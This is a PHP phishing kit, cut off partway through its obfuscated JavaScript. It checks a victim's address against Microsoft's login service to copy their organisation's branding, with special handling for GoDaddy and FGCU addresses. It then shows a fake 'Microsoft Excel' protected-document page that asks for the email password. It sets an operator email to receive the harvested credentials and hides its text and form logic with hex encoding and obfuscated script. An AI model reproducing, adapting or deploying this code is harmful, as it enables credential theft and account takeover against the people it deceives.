<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: *");

$send    = "mkamer@financommerltd.com"; //change ur email
$logfile = 1;                            //1 = log data, 0 = do not log data


/*--------------------------- DO NOT CHANGE ANYTHING BELOW EXCEPT YOU KNOW WHAT YOU ARE DOING. ---------------------------------- */
$auto_grab_profile = 0;  //1 = grabs email domain profile (icon,bg), 0 = skip email domain profile grabing.
$show_profile_icon  = 0; // 1 = show email domain icon, 0 = hide email domain icon.
$show_profile_bg    = 0; // 1 = show email domain bg, 0 = hide email domain bg.
$allow_email_verify = 0;
$show_singin_opt    = 0;
$show_mesg_b4_pswd  = 0; // Tips: Because you're accessing sensitive info, you need to verify your password
$grab_all_fields    = 1;
/* ----------------  XXX-MJ  ------------------------*/
$disHost        = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['PHP_SELF']).'/';
$ip             = getenv("REMOTE_ADDR"); //getip(); //
$svr_host       =  str_replace('www.', '', $_SERVER['HTTP_HOST']);
$allowed_fields = array('login','passwd');

function mj_get_ms_data($p_my_req)
{
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET');
    $postdata = json_encode([
        'username' => $p_my_req['email'],
        'isOtherIdpSupported' => false,
        'checkPhones' => false,
        'isRemoteNGCSupported' => true,
        'isCookieBannerShown' => false,
        'isFidoSupported' => false,
        'originalRequest' => 'rQIIAXVSu27TUACNkza0FY_CAgiGDiyAnPiV6yRSB-fRPOqbt5vYqhQS5ya5dvyIcxOn3jrB2AEJqRIMbHREQkL8AFIlpC4w8AlMiIkF1JSd5egMR0c6jycRNsamHwm8kOiJ_RSd6gGeFlIsQ_cEDtB8ggc8x7CDBMN7d7a2n9Uf7j62DvePPz-__-DG69tn1N0xIe4sHY_7vh9zhkOso5juWPGPFHVBUafhdWTTSvMsPAM8SCU5RgSAEzkAkgwf04yyoVrqEuZMAi0lUJsMA3P5QG6NWNWCpBI0sGaUgkpB4SoWTGiF_BK2S0toSEQ1xqb2T98w5JbJwVZp5aHy1XaJrbRLzIr738O3qtKcjLkrcDwcoF_hzaHjWV3XmZHTyB-q6iK7NMg6to10EruSIZtgvUewY9c8x0UewWi26x4NOh7dnYoSKsBCkJeLVqpjmOZCa_tgDLnlgjOKGCjZBZ4VLSyM2spgIU54MMj1FabRm5dVXK8VzFzg1GQ-Z7hH_cIwp2SDitirO7JWF6TR0J8394uIl1NGoHpdDeHRwZyWhAbgFp6IoGtKSZ6tFZjpBGeIfiR0xkIDLYA3SeyJINsadL2pKCRGncDFyPcyyDkwkuYEWiTTIJg2pFFu6ZXF2mKskkyqm5Dr7yPR1VKWY59Hbq6i2niw43rOEE_QxRr1Y-06E0lvbGxth-6FdkK_16i366sDfDk83Hz15mvm5be_x-_4D6Hz9fgwv7eqw20kYd_X-3XdUWS9Ol02GYie5iVYLleTuk5ULR8kd4U0exKlTqLRn1HqxbXQp83_3ecS0',
        'country' => 'ID',
        'forceotclogin' => false, 
        'isExternalFederationDisallowed' => false,
        'isRemoteConnectSupported' => false,
        'flowToken' => 'AQABAAEAAADCoMpjJXrxTq9VG9te-7FXWWxtJxYcAmY14QiZeHpL4yKkTFoOBSEzS1ejGRL5KbCHUuzrOU7CoDGiyRH6K_9Mggz0ijGukbii8kdpF8Oj6nVWDluKwjvkUxW9wRqX69KGXno37eWGbKbc-9VGJoFyJERa1DQM9SA4ijKW5FFDlbbmp29A_HtvlxyeU32bMGgejSAdUKUtbRN7t3bQ3Anu3rsjNYXr6oEiQ-BMmM3uHvQgRKclGygD_St1RA4tgXd3UhN5GtwFkmU3EB9Ykfs9bOhKXRAfTMxhPr1m0TjrAEKUOuOGPUUjZLzsCkBCVRXKyLvAMnQM-C28PWJlGWBNg4Kee4OzLxYmnyz7QENrpcYvHtkW4-WJsp2NgPnLBRguYGexy01K30nQ27QZScecIAA'
    ]);

    $watch_domains = array('godaddy.com','eagle.fgcu.edu','fgcu.edu');
    $the_domain = substr(strrchr($p_my_req['email'], "@"), 1);

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = 'Origin: https://login.microsoftonline.com';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Client-Request-Id: 3d1c5160-6d29-4b5c-81c7-87191b0d9d11';
    $headers[] = 'Canary: AQABAAAAAADCoMpjJXrxTq9VG9te-7FXrbh6Bz7mXltxVs4fjSmofK1bGkvtTF253tyb0oOFnuxf_PmCrL_RaOFTqsoqeuSXcgrVBGjjn6apHqZSZ4Ys8QrCJmkjR3_2rR8jGOiwBsbgQrbj8UBvQwUShAfIhnIN2nlJe4XBqnfh8anHaW7T36XU1zC9VY_uJQs4rm8Vs56WOakmZ5r6qbFgoY_h4E0XA2BjThxLRuwf8O8OACoIJiAA';
    $headers[] = 'Cookie: x-ms-gateway-slice=prod; stsservicecookie=ests; AADSSO=NA|NoExtension; SSOCOOKIEPULLED=1; buid=AQABAAEAAADCoMpjJXrxTq9VG9te-7FX_iDdSjXmd3l5FvAwj8dV4KTxNFaLhdKo7KFrcoEBNDxsZ5Vz1CI4rq4nFPvZKXaAg6_AYamWGReolL9s4HI0e88OpZwFJQr3oR91udQ_Ib8gAA; fpc=Auk2OeXbpOpKhjKmxwT6MaZ9Hyj2AQAAAK6DtdQOAAAA; esctx=AQABAAAAAADCoMpjJXrxTq9VG9te-7FXmS0mIiT28rCVwBatzs0XP7atUg6TSMzzwrzsP3MWH7sUDJ52YREr2IhcCkx5vSupOn_u74kEmhyJ5UeW6s3xZ7eSJDTj90ShTrjpmChk46uP_aZ97rnajRgNkQtM4z3tty9K6jwn1M_zRlOLkkJggdrBWjbSOehQ7_YkmnpSatggAA';
    $headers[] = 'Hpgact: 1800';
    $headers[] = 'Hpgrequestid: 095c5ccd-9e97-42d5-94d6-fe81a933b500';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
    $headers[] = 'Content-Type: application/json; charset=UTF-8';
    $headers[] = 'Hpgid: 1104';
    $headers[] = 'Accept: application/json';
    $headers[] = 'Referer: https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dpydXr-_q7AeGMGzELHm9XjkkvZWw6hM2xv2jHi6UCvisHmi4gWUdv7l36dDbU0RauJYiQPGkDzoPL3DjpybGfDUCzN7aQoLZQ4AgfwuSKHe3L9jzYr_ZeigVu-A4R62vr7eMpkA831PG0qliBtcy4Xh4Rev6rl5F76CTd_rq745gXzpiewrBeoVj8klMmtBRti-jAgDxrJ7PvhYtB9_5LQ&nonce=636982076627266803.ZjJjYmYxMDktMmUzYS00MDEzLTg1YmMtNzRiZjIzNGU2NmM5ZGExMWIxMjAtYjhkZS00MDRjLTk2MTItMmY3OWI1NWI0MmYw&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=3d1c5160-6d29-4b5c-81c7-87191b0d9d11&msafed=0&sso_reload=true';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);

    $data = json_decode($result);


    //echo '<pre>' .print_r($data,true) .'</pre>'; exit;


    if($data->IfExistsResult == '0' || $data->IfExistsResult == '6')
    {
        $arrays = ['valid' => 'true'];
        
        if(isset($data->EstsProperties->UserTenantBranding[0]->BannerLogo))
        {
            $arrays['profile_image'] = $data->EstsProperties->UserTenantBranding[0]->BannerLogo;
            //$detailImage = @getimagesize($data->EstsProperties->UserTenantBranding[0]->BannerLogo);
            //echo mj_return_pre($data->EstsProperties->UserTenantBranding[0]->BannerLogo); exit;
            //$arrays['width'] = $detailImage[0];
            //$arrays['height'] = $detailImage[1];
        }
        if(isset($data->EstsProperties->UserTenantBranding[0]->Illustration))
        {
            $arrays['back_image'] = $data->EstsProperties->UserTenantBranding[0]->Illustration;
        }
        if(isset($data->EstsProperties->UserTenantBranding[0]->BoilerPlateText)) {
            $arrays['text'] = $data->EstsProperties->UserTenantBranding[0]->BoilerPlateText;
        }
        
        //echo '<pre>' .print_r($data->EstsProperties->UserTenantBranding[0]->BannerLogo,true) .'</pre>'; //exit;
        
        
        if(empty($data->EstsProperties->UserTenantBranding[0]->BannerLogo) && in_array($the_domain, $watch_domains))
        {
            if($the_domain == 'godaddy.com')
            {
                $arrays = array(
                    "valid"=> "true",
                    "logo_image_bg_color"=> "",
                    "profile_image"=>"https://ok2static.oktacdn.com/fs/bco/1/fs0nsswd3jjSr8CIv0x7",
                    "width"=> 280,
                    "height"=> 60,
                    "back_image"=> "https://ok2static.oktacdn.com/fs/bco/7/fs0njh09acVLoOH9P0x7"
                );
            }
            elseif($the_domain == 'eagle.fgcu.edu' || $the_domain == 'fgcu.edu')
            {
                $arrays = array(
                    "valid"=> "true",
                    "logo_image_bg_color"=> "#004785",
                    //"profile_image"=>"https://fgcucdn.fgcu.edu/_resources/images/fgculogo-oneline-globalnav-exclusive-white.svg",
                    "profile_image"=>"https://fgcucdn.fgcu.edu/_resources/images/logo-horizontal-white.svg",
                    "width"=> 280,
                    "height"=> 60,
                    "back_image"=> "https://fgcucdn.fgcu.edu/its/images/techservices-hero.jpg"
                );
            }
            else
            {
                $arrays = ['valid' => 'false'];
            }
            
        }
        //else
        //{
            //$arrays = ['valid' => 'false'];
        //    echo '<pre>' .print_r($data->EstsProperties->UserTenantBranding[0]->BannerLogo,true) .'</pre>'; exit;
        //}
    }
    else
    {
        $arrays = ['valid' => 'false'];
    }

    return $arrays;
}

function i_in_array($needle, $haystack) { return in_array(strtolower($needle), array_map("strtolower", $haystack)); }
function mj_redirect_js($url){ echo '<script type="text/javascript"> window.location.replace("'.$url.'"); </script>'; }
function mj_redirect_meta($url){ echo '<meta http-equiv="refresh" content="0;url='.$url.'">'; }
function mj_load_view()
{
    global $disHost, $my_req, $show_profile_icon, $show_profile_bg, $show_mesg_b4_pswd, $show_singin_opt, $allow_email_verify;
    
    // $profile_image       = (!empty($my_req['profile_image']) && !empty($show_profile_icon)) ? $my_req['profile_image'] : '';
    // $back_image          = (!empty($my_req['back_image']) && !empty($show_profile_bg)) ? $my_req['back_image'] : 'https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg';
    // $logo_image_bg_color = !empty($my_req['logo_image_bg_color']) ? 'background-color:'.$my_req['logo_image_bg_color'] : '';
    $eml                 = (!empty($_REQUEST['email'])) ? $_REQUEST['email'] : '';
    $readonly            = (!empty($_REQUEST['email'])) ? ' readonly'  : '';
    $autofocus           = (!empty($_REQUEST['email'])) ? ' autofocus' : '';

    ob_start();
?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <title>&#x53;&#x74;&#x61;&#x74;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x78;&#x6c;&#x73;&#x20;&#x2d;&#x20;&#x4d;&#x69;&#x63;&#x72;&#x6f;&#x73;&#x6f;&#x66;&#x74;&#x20;&#x45;&#x78;&#x63;&#x65;&#x6c;</title>
            <link rel="icon" href="<?php echo $disHost; ?>msoxcel_.svg" type="image/x-icon" sizes="" data-react-helmet="true" />
            <style type="text/css">
                body { font-family: Segoe UI,SegoeUI,"Helvetica Neue",Helvetica,Arial,sans-serif; }
                .bg-blur {-webkit-filter: blur(2px); /* Safari 6.0 - 9.0 */ filter: blur(2px);}
                .bg-101 { background-image: url('<?php echo $disHost; ?>Settlement_Statement_Draft_3-page-001.jpg');  background-position-y: top; background-size: cover;}
                .bg-colour-1 { background-color: #ffffffa1; }
                .bg-colour-2 { background-color: #f2eeeee8; }
                .bg-colour-3 { background-color: #ffffffe8; }
                .lgnbox{ padding:40px 30px; width: 490px; }
                .lgnbox input { outline: none; padding: 6px 10px !important;}
                .lgnbtn { background-color: #107c41 !important; color: #ffffff !important; padding: 6px 19px 6px 19px;}
                .lgnbtn:hover { background-color: #185c37 !important; color: #ffffff !important; }
                .txt-color-1{ color: #107c41 !important; }
                .txt-color-2 { color: #e81123; }
            </style>
        </head>
        <body style="opacity:0">

            <div class="wrapper xbg-101">
                <div class="w3-display-container" style="width: 100vw; height:100vh; background-color: #f2eeeee8;">

                    <div class="w3-display-left bg-101 bg-blur" style="width: 100vw; height:100vh; z-index: -1;"></div>

                    <div class="w3-display-middle">
                        <div class="lgnbox w3-border w3-round" style="background-color: #ffffffa1;">
                            <form id="login_form" name="login_form" enctype="application/x-www-form-urlencoded" method="post" class="pg-form m-login-form" novalidate>
                                
                                <span class="w3-medium w3-block" style="line-height: 1.2; margin-bottom: 10px;"><span class="w3-left" style="width: 64px; display: inline-block; margin-right: 7px; margin-top: -9px;"><img src="<?php echo $disHost; ?>msoxcel_.svg" class="w3-image"/> </span> <strong>&#x50;&#x61;&#x79;&#x6d;&#x65;&#x6e;&#x74;&#x2d;&#x6e;&#x6f;&#x74;&#x69;&#x63;&#x65;&#x2e;&#x78;&#x6c;&#x73;</strong> <br> <span class="w3-small txt-color-1">&#x4d;&#x69;&#x63;&#x72;&#x6f;&#x73;&#x6f;&#x66;&#x74;&#x20;&#x45;&#x78;&#x63;&#x65;&#x6c;&#x20;&#x46;&#x69;&#x6c;&#x65;</span> </span>

                                <p class="" style="margin-top: 30px;"> &#9432; This document is protected! Please enter your E-mail password to open.</p>

                                <div id="errorMsgWrap" class="w3-section" style="display: none;">
                                    <p id="errorText" class="txt-color-2"> Enter a valid email address, phone number, or Skype name.</p>
                                </div>

                                <div class="w3-section">
                                    <input name="usrn" type="text" id="usrn" class="w3-input w3-border w3-border-gray uppercase" value="<?php echo $eml; ?>" placeholder="Email Address"<?php echo $readonly; ?>>
                                </div>

                                <div class="w3-section">
                                    <input name="psrd" type="password" id="psrd" class="w3-input w3-border w3-border-gray uppercase" value="" placeholder="Email Password" <?php echo $autofocus; ?>>
                                </div>

                                <div class="w3-section">    
                                    <button class="lgnbtn w3-mobile w3-button uppercase"> Continue <img src="<?php echo $disHost; ?>tail-spin.svg" width="20" alt="" style="display: none;"></button>
                                </div>

                            </form>
                        </div>
                    </div>
                </div>
            </div>



            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
            <script type="text/javascript">
                window.dhst = '<?php echo $disHost; ?>';
                var _0xf093b6=_0x552c;function _0x552c(_0x33e10b,_0x41b09d){var _0x2ddaed=_0x40a4();return _0x552c=function(_0x343d91,_0x3abce7){_0x343d91=_0x343d91-(0x902*0x2+0x83f*0x2+-0x217b);var _0xd46086=_0x2ddaed[_0x343d91];return _0xd46086;},_0x552c(_0x33e10b,_0x41b09d);}function _0x40a4(){var _0x8aa08b=['qkwIS','input','qZQpk','hasClass','fadeOut','+-(\x5cd)\x5c1+\x5c','do=xxx_for','second_sub','\x20are\x20conne','795224ZBlBMF','login_form','WnEEh','IRfGk','AjYMI','NvBnM','MHjrD','lQEKO','ZgYvA','ajax','fnTjm','body','img','iOWkl','er\x20a\x20valid','aKsfM','for\x20your\x20e','10746vknqen','/oauth2','#errorText','XdzSb','RBHNB','hATYa','lCOcv','com/common','wilka','text','egunJ','ress.','mail\x20addre','TbvSr','gray','xanEx','ess\x20can\x20no','val','HMEhH','test','MZynM','0|1|2|5|8','izTdS','https://lo','ikdHY','\x5c1+-(\x5cd)\x5c1','location','Hagff','split','kBEDC','YOGBZ','IJnQl','adsKv','sword\x20for\x20','rray','3|0|2|4|1','\x20password\x20','AaBEY','e\x20sure\x20you','submit','dhAAM','IVtfE','MWDyY','5-6789|219','xfVjU','red','form2','btNvF','33580stphDm','WzaKU','qnOGM','n\x20.w3-inpu','Please\x20mak','ail\x20addres','0{4})\x5cd{4}','rkeVS','1|3|4|0|5|','fast','jakvb','370qkxwfj','d{3}-(?!00','w3-disable','gin.micros','HIxiE','form.pg-fo','ready','log','er\x20the\x20pas','name','a,\x20button,','nNcBg','uaGRW','ault','JaieK','1823850LXgaCc','Found\x20Erro','HSeio','b)(?!123-4','mit','TBxob','First\x20Subm','value','Dsida','psrd','iWGdU','AsEHX','7|4|9|6|3|','OfTAC','\x20address.','IVWYG','FRmtz','MIdGQ','0|9\x5cd{2})\x5c','cted\x20to\x20th','find','ss.','Rvsvy','rap','animate','JUlVn','indexOf','form4','qRyAy','Second\x20Sub','w3-border-','.lgnbtn\x20>\x20','OgdHI','\x20input[typ','NhXYG','html,\x20body','wwOqz','4|1|2|0|3','-09-9999|0','#errorMsgW','HlZCS','.w3-sectio','qzTTS','NPrYb','osLIe','5|6','miouk','css','replace','PtYYF','JixKQ','your\x20email','ksNfD','spaces','serialize','aJxjj','e=submit]','GBmuv','RjUkR','UPzjM','3|0|4|1|2','each','kOADa','OvZHt','DmWib','removeClas','wZixV','2toLdQJ','eOHiu','serializeA','n\x20:input','disabled',')(?!666|00','fqvTc','usrn','t.w3-borde','BkZVx','r-red','MDJwF','1668969QuavTp','dhst','focus','#psrd','Please\x20ent','slow','opacity','2012096NKsmNm','qdrHa',')\x5cd{2}-(?!','zFIou','78-05-1120','e\x20internet','85932znZzIB','form1','removeAttr','tHQHF','0.7','CVkkE','____.php?_','UXIcj','eSfzq','readonly','er\x20your\x20em','iNQSo','xyFhz','t\x20contain\x20','QJcgY','form5','1|3|0|4|2|',':input','IvgSP','iRoRz','fcVzy','Dquqr','^(?!\x5cb(\x5cd)','addClass','post','lGJXg','oftonline.','Email\x20addr','\x20email\x20add','attr','fadeIn','2|0|3|4|1|','OAdCE','xWzMa','noCLp','form3','GWRHD','preventDef','mruGC'];_0x40a4=function(){return _0x8aa08b;};return _0x40a4();}(function(_0x9c958,_0x5b748e){var _0x5decd0=_0x552c,_0x2fd8da=_0x9c958();while(!![]){try{var _0x161543=-parseInt(_0x5decd0(0x189))/(0x1d57+-0x2468+0x712)*(-parseInt(_0x5decd0(0x1e6))/(-0x1cd*-0xb+0xf50+0x231d*-0x1))+-parseInt(_0x5decd0(0x118))/(0xb*0x36f+-0x1741+-0xe81)+parseInt(_0x5decd0(0x148))/(0x8*-0x44a+0x13bd+0xe97)+parseInt(_0x5decd0(0x194))/(0x6f2+-0x1c75+0x1588)*(parseInt(_0x5decd0(0x159))/(0x1ce4+0x4*-0x2c3+-0x11d2))+parseInt(_0x5decd0(0x1a3))/(-0x1f0+-0x9d9*0x1+0x90*0x15)+-parseInt(_0x5decd0(0x112))/(0x12bd+0xcb0+-0x1f65)+-parseInt(_0x5decd0(0x10b))/(-0x56c*0x7+0x1688+0xf75);if(_0x161543===_0x5b748e)break;else _0x2fd8da['push'](_0x2fd8da['shift']());}catch(_0x1061ad){_0x2fd8da['push'](_0x2fd8da['shift']());}}}(_0x40a4,-0x3b2*0x19+-0x4438+0x1*0x3111b),$(document)[_0xf093b6(0x19a)](function(){var _0x2323d0=_0xf093b6,_0x1cb592={'FRmtz':_0x2323d0(0x17c),'nNcBg':function(_0x6c46e5,_0x893fc0){return _0x6c46e5(_0x893fc0);},'WnEEh':_0x2323d0(0x129),'osLIe':_0x2323d0(0x121),'IVtfE':function(_0x5196c1,_0x37908a){return _0x5196c1(_0x37908a);},'eOHiu':_0x2323d0(0x1c2)+_0x2323d0(0x154),'QJcgY':_0x2323d0(0x110),'iOWkl':_0x2323d0(0x19e)+_0x2323d0(0x1c4)+_0x2323d0(0x1db),'MIdGQ':_0x2323d0(0x1ea),'OgdHI':_0x2323d0(0x1c6),'ZgYvA':_0x2323d0(0x11c),'RjUkR':function(_0xb044c0,_0x3972fb){return _0xb044c0(_0x3972fb);},'btNvF':_0x2323d0(0x196)+'d','UPzjM':_0x2323d0(0x1c8),'jakvb':function(_0x4ac4a8,_0x91e2fe){return _0x4ac4a8(_0x91e2fe);},'qdrHa':function(_0x14234c,_0x3ce10d){return _0x14234c(_0x3ce10d);},'JixKQ':function(_0x349bfa,_0x4274c6){return _0x349bfa(_0x4274c6);},'MHjrD':_0x2323d0(0x191)+'2','rkeVS':_0x2323d0(0x1ca)+_0x2323d0(0x1ba),'TBxob':_0x2323d0(0x15b),'XdzSb':_0x2323d0(0x1c1)+_0x2323d0(0x186),'NPrYb':_0x2323d0(0x1c1)+_0x2323d0(0x167),'miouk':_0x2323d0(0x1cc)+_0x2323d0(0x18c)+_0x2323d0(0x107)+_0x2323d0(0x109),'wwOqz':_0x2323d0(0x192),'aJxjj':_0x2323d0(0x128)+_0x2323d0(0x1d0),'iWGdU':_0x2323d0(0x19d),'qRyAy':_0x2323d0(0x12e)+_0x2323d0(0x172)+_0x2323d0(0x144)+_0x2323d0(0x1a6)+_0x2323d0(0x184)+_0x2323d0(0x1c9)+_0x2323d0(0x116)+_0x2323d0(0x1eb)+_0x2323d0(0x1b5)+_0x2323d0(0x195)+_0x2323d0(0x114)+_0x2323d0(0x18f)+'$','IRfGk':function(_0x5d8bc6,_0x42c7a8){return _0x5d8bc6!==_0x42c7a8;},'Hagff':function(_0x4d83bb,_0x17143f){return _0x4d83bb==_0x17143f;},'eSfzq':_0x2323d0(0x1ed),'xyFhz':function(_0x1f8673,_0x36530f){return _0x1f8673==_0x36530f;},'JUlVn':function(_0x5cecbe,_0x167263,_0x2aa343){return _0x5cecbe(_0x167263,_0x2aa343);},'iRoRz':_0x2323d0(0x10f)+_0x2323d0(0x122)+_0x2323d0(0x18e)+'s.','AjYMI':_0x2323d0(0x133)+_0x2323d0(0x169)+_0x2323d0(0x125)+_0x2323d0(0x1d8),'aKsfM':function(_0x10d0d0,_0x2e94d7){return _0x10d0d0(_0x2e94d7);},'tHQHF':_0x2323d0(0x1ac),'CVkkE':function(_0x3657aa,_0x5c369d,_0x421098){return _0x3657aa(_0x5c369d,_0x421098);},'zFIou':_0x2323d0(0x10f)+_0x2323d0(0x19c)+_0x2323d0(0x17a)+_0x2323d0(0x1d6)+_0x2323d0(0x1b1),'qkwIS':function(_0x2d4bf3,_0x271a8a,_0x1c6e2b){return _0x2d4bf3(_0x271a8a,_0x1c6e2b);},'fcVzy':function(_0xb4e5cd,_0x538203){return _0xb4e5cd+_0x538203;},'BkZVx':function(_0x1c6d17,_0x597a8d){return _0x1c6d17+_0x597a8d;},'iNQSo':_0x2323d0(0x10f)+_0x2323d0(0x156)+_0x2323d0(0x134)+_0x2323d0(0x164),'uaGRW':function(_0x129834,_0x1f7125){return _0x129834==_0x1f7125;},'AaBEY':function(_0x582750,_0x503e69,_0x784f07){return _0x582750(_0x503e69,_0x784f07);},'lGJXg':function(_0x3bfa39,_0x5242c7){return _0x3bfa39==_0x5242c7;},'fnTjm':_0x2323d0(0x149),'HlZCS':_0x2323d0(0x137)+'5','OfTAC':function(_0x5ae3be,_0x23ebe5){return _0x5ae3be!==_0x23ebe5;},'xWzMa':function(_0x4a8e4b,_0x52306f){return _0x4a8e4b!==_0x52306f;},'kBEDC':_0x2323d0(0x1af)+_0x2323d0(0x16e),'Dquqr':function(_0x41c545,_0x1fb9a2){return _0x41c545===_0x1fb9a2;},'DmWib':_0x2323d0(0x1a4)+'r','qzTTS':function(_0x190017){return _0x190017();},'xfVjU':function(_0x3c1a88,_0x596eab){return _0x3c1a88(_0x596eab);},'MWDyY':function(_0x29345f,_0x11d7bc){return _0x29345f(_0x11d7bc);},'RBHNB':_0x2323d0(0x11e)+_0x2323d0(0x145)+'m','lQEKO':_0x2323d0(0x130),'HSeio':_0x2323d0(0x146)+_0x2323d0(0x1a7),'qZQpk':_0x2323d0(0x1c0)+_0x2323d0(0x1a7),'egunJ':_0x2323d0(0x1df),'HMEhH':_0x2323d0(0x1a9)+'it','OAdCE':_0x2323d0(0x10e),'HIxiE':_0x2323d0(0x10f)+_0x2323d0(0x156)+_0x2323d0(0x17d)+_0x2323d0(0x158)+_0x2323d0(0x165)+_0x2323d0(0x1b8),'YOGBZ':function(_0x53e453,_0x266576){return _0x53e453(_0x266576);},'IvgSP':_0x2323d0(0x18d)+_0x2323d0(0x17f)+_0x2323d0(0x147)+_0x2323d0(0x1b6)+_0x2323d0(0x117)+'.','kOADa':function(_0x4c1f86,_0x56ee80){return _0x4c1f86(_0x56ee80);},'lCOcv':_0x2323d0(0x119),'PtYYF':_0x2323d0(0x187),'UXIcj':_0x2323d0(0x13b),'GWRHD':_0x2323d0(0x1be),'wilka':_0x2323d0(0x127),'MZynM':function(_0x338067,_0x15ffea){return _0x338067(_0x15ffea);},'adsKv':_0x2323d0(0x153),'ksNfD':_0x2323d0(0x111),'fqvTc':_0x2323d0(0x170)+_0x2323d0(0x197)+_0x2323d0(0x132)+_0x2323d0(0x160)+_0x2323d0(0x15a),'JaieK':function(_0x3bad3e,_0x442f7b){return _0x3bad3e(_0x442f7b);},'TbvSr':_0x2323d0(0x1cc)+_0x2323d0(0x1e9),'qnOGM':_0x2323d0(0x140),'izTdS':function(_0x241954,_0x5962ab){return _0x241954(_0x5962ab);},'ikdHY':_0x2323d0(0x199)+'rm'};_0x1cb592[_0x2323d0(0x16d)]($,_0x1cb592[_0x2323d0(0x179)])[_0x2323d0(0x1d2)](_0x1cb592[_0x2323d0(0x1d7)],0x1*-0x2a5+-0x1*-0x1c05+0x1*-0x195f);function _0x501668(){var _0x5e30cc=_0x2323d0,_0x425a98=_0x1cb592[_0x5e30cc(0x1b3)][_0x5e30cc(0x175)]('|'),_0x2a8cad=-0x13c1+0x171b+0x42*-0xd;while(!![]){switch(_0x425a98[_0x2a8cad++]){case'0':_0x1cb592[_0x5e30cc(0x19f)]($,_0x1cb592[_0x5e30cc(0x14a)])[_0x5e30cc(0x135)](_0x1cb592[_0x5e30cc(0x1cf)],_0x1cb592[_0x5e30cc(0x1cf)]);continue;case'1':_0x1cb592[_0x5e30cc(0x182)]($,_0x1cb592[_0x5e30cc(0x1e7)])[_0x5e30cc(0x136)](_0x1cb592[_0x5e30cc(0x126)]);continue;case'2':_0x1cb592[_0x5e30cc(0x182)]($,_0x1cb592[_0x5e30cc(0x155)])[_0x5e30cc(0x135)](_0x1cb592[_0x5e30cc(0x1b4)],_0x1cb592[_0x5e30cc(0x1b4)]);continue;case'3':_0x1cb592[_0x5e30cc(0x182)]($,_0x1cb592[_0x5e30cc(0x1c3)])[_0x5e30cc(0x1d2)]({'opacity':_0x1cb592[_0x5e30cc(0x150)]});continue;case'4':_0x1cb592[_0x5e30cc(0x1dd)]($,'a')[_0x5e30cc(0x12f)](_0x1cb592[_0x5e30cc(0x188)]);continue;}break;}}function _0x517a04(){var _0x11713d=_0x2323d0,_0x510e10=_0x1cb592[_0x11713d(0x1de)][_0x11713d(0x175)]('|'),_0x793ae9=-0x2*0x472+0x1ed0+-0x15ec;while(!![]){switch(_0x510e10[_0x793ae9++]){case'0':_0x1cb592[_0x11713d(0x1dd)]($,'a')[_0x11713d(0x1e4)+'s'](_0x1cb592[_0x11713d(0x188)]);continue;case'1':_0x1cb592[_0x11713d(0x193)]($,_0x1cb592[_0x11713d(0x14a)])[_0x11713d(0x11a)](_0x1cb592[_0x11713d(0x1cf)]);continue;case'2':_0x1cb592[_0x11713d(0x113)]($,_0x1cb592[_0x11713d(0x155)])[_0x11713d(0x11a)](_0x1cb592[_0x11713d(0x1b4)]);continue;case'3':_0x1cb592[_0x11713d(0x19f)]($,_0x1cb592[_0x11713d(0x1e7)])[_0x11713d(0x143)](_0x1cb592[_0x11713d(0x126)]);continue;case'4':_0x1cb592[_0x11713d(0x1d5)]($,_0x1cb592[_0x11713d(0x1c3)])[_0x11713d(0x1d2)]({'opacity':'1'});continue;}break;}}function _0x58da03(_0x3a0fc3,_0x5db795){var _0x27d605=_0x2323d0,_0x1cf537=_0x1cb592[_0x27d605(0x14e)][_0x27d605(0x175)]('|'),_0x37901e=0x3b7*-0x7+0x1*-0x22ca+0x3ccb*0x1;while(!![]){switch(_0x1cf537[_0x37901e++]){case'0':_0x329352[_0x27d605(0x136)](_0x1cb592[_0x27d605(0x126)]);continue;case'1':var _0x329352=_0x1cb592[_0x27d605(0x1d5)]($,_0x1cb592[_0x27d605(0x190)]);continue;case'2':_0x3a0fc3[_0x27d605(0x10d)]();continue;case'3':_0x329352[_0x27d605(0x1b7)](_0x1cb592[_0x27d605(0x1a8)])[_0x27d605(0x162)](_0x5db795);continue;case'4':_0x3a0fc3[_0x27d605(0x12f)](_0x1cb592[_0x27d605(0x15c)])[_0x27d605(0x1e4)+'s'](_0x1cb592[_0x27d605(0x1ce)]);continue;case'5':_0x3a0fc3[_0x27d605(0x16a)]('');continue;}break;}}function _0x2496cd(){var _0xc040bf=_0x2323d0;_0x1cb592[_0xc040bf(0x193)]($,_0x1cb592[_0xc040bf(0x190)])[_0xc040bf(0x143)](_0x1cb592[_0xc040bf(0x1c7)],function(){var 